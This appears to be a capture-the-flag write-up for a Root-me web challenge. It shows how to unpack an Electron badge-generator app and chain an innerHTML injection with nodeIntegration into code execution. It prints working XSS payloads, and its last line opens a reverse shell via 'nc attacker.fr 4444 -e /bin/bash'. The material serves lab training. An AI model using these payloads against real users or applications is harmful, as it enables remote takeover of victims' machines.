# Badge Generator v2

## Challenge

>   Root-me has decided to make job interviews & CV creation easier for its users by creating an application that generates a badge that can be easily integrated into one's CV.
>
>   You can send your CV to the following address and an employee will give you feedback on your badge.
>
>   Author : `Elweth` 

- Category: Web
- Difficulty: Medium

## Déploiement

- Docker compose

```bash
docker compose up
``` 

## Writeup

The application allow to parse root-me profile to generate a badge.

First it's possible to download the application on the web page at the address :

- http://[target]/static/badge-creator_2.0.0_amd64.deb

Once the .deb downloaded it's possible to install it with the following command

```bash
sudo dpkg -i badge-creator_2.0.0_amd64.deb
``` 

It's now possible to run the application directly in command line

```bash
badge-creator
```

![Badge1](/images/badge1.png)

How it works is pretty straightforward: the user enters a nickname and a badge is generated with the user's profile photo, biography and a few stats on rank, points, etc.

If you take a closer look at the .deb file, you can decompress it to recover its contents. We can do this with 'dpkg-deb' binary

```bash
dpkg-deb -xv badge-creator_2.0.0_amd64.deb .
```

Once extracted we get a lot of files, and you can quickly see that it's an Electron application, thanks to the `opt/badge-creator/resources/app.asar` file.

A little research on the Internet reveals that it is possible to extract the contents of the archive to recover the source code of the Electron application. 

- https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file

```bash
npx @electron/asar extract app.asar output/
```

We got the source of the application : 

```bash
$ tree -L 2 output/
output
├── assets
│   └── image.png
├── launch.sh
├── main.js
├── node_modules
│   ├── axios
│   ├── boolbase
│   ├── cheerio
│   ├── cheerio-select
│   ├── css-select
│   ├── css-what
│   ├── domelementtype
│   ├── domhandler
│   ├── dom-serializer
│   ├── domutils
│   ├── entities
│   ├── follow-redirects
│   ├── htmlparser2
│   ├── nth-check
│   ├── parse5
│   └── parse5-htmlparser2-tree-adapter
├── package.json
├── renderer.js
└── views
    └── index.html

19 directories, 6 files
``` 

We can now begin to analyze the sources and understand how the application works.

The main.js file is the application's entry point, and takes care of creating the Electron window.

Parameters are passed to it, notably 'nodeIntegration' and 'contextIsolation'.

When the nodeIntegration parameter is set to 'true' it makes possible to execute NodeJS code in Electron windows.

- main.js

```javascript
function createWindow(pseudo = null) {
    const win = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
        },
        icon: path.join(__dirname, 'assets', 'image.png')
    });

    win.loadURL(`file://${__dirname}/views/index.html`).then(() => {
        if (pseudo) {
            win.webContents.send('auto-get-user-info', pseudo);
        }
    });
}
```

In terms of how data parsing works, the application uses the username entered by the user to make an HTTP request to `https://www.root-me.org/<pseudo>`, and then retrieves the HTML tags containing the user's Biography.

```javascript
const url = `https://www.root-me.org/${pseudo}`;
const response = await axios.get(url);
const $ = cheerio.load(response.data);

...

const bioElement = $('li[class^="crayon auteur-bio-"]');
const bio = bioElement.text() || '';
console.log('Extracted bio:', bio);

...

return { image: fullImgUrl, bio: bio || null, rank, points, challenges, compromissions };
```

Once the data has been retrieved, it is returned to the renderer.js file, which is responsible for displaying it in the window.

Something interesting here is that the data is retrieved as 'text' and then passed into an innerHTML, leaving the possibility of interpreting the HTML tags present in the user's biography.

- renderer.js

```javascript
bioElement.innerHTML = bio;
```

We can insert HTML tags in our biography like this : 

![HTMLi](/images/htmli.png)

However, the tags are not interpreted in electron app, since the data is retrieved in text, not HTML.
 
We're going to have to ensure that our Biography contains HTML code, but without it being interpreted.

To do this, we're going to use the tags offered by SPIP, which can be used to display code.

We have to insert the following content in our bio : 

```html
<code class="html"><u>HTML Injection revenge!</u></code>
```

Now the HTML tags is interpreted in the Electron app.

![htmli2](/images/htmli2.png)

It's possible to change our payload to call Javascript to confirm the XSS :

```html
<code class="html"><img src=x onerror=alert('wtf')></code>
```
![alt text](/images/xss-electron.png)

If you look at main.js, you'll see that the application uses nodeIntegration set to true, allowing NodeJS code to be executed from the Electron window.

We can therefore use our XSS to directly call NodeJS code that will be interpreted on the backend.

```html
<code class="html"><img src=x onerror='require("child_process").exec("nc attacker.fr 4444 -e /bin/bash",function(error,stdout,stderr){console.log(stdout);});'></code>
```

![Flag](/images/flag_badge_creator.png)